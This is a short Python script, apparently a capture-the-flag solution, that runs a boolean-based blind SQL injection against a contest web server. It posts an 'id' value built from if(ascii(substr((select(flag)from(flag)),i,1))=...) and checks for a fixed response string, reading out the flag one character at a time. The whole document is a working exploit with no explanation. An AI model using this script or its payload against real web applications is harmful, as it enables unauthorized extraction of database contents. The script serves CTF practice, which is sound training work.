import requests

global url
url="http://node4.anna.nssctf.cn:28559/index.php"

global chars
chars="_-{}1234567890qwertyuiopasdfghjklzxcvbnm1234567890QWERTYUIOPASDFGHJKLZXCVBNM"

def send_payload(payload):
    r=requests.post(url,data=payload)
    if "Hello, glzjin wants a girlfriend." in r.text:
        return True
    return False



if __name__ == "__main__":
    i=1
    while True:
        #print(i)
        for char in chars:
            #print(ord(char))
            payload={"id":f"if(ascii(substr((select(flag)from(flag)),{i},1))={ord(char)},1,2)"}
            if send_payload(payload):
                print(char,end='')
                break
        i+=1
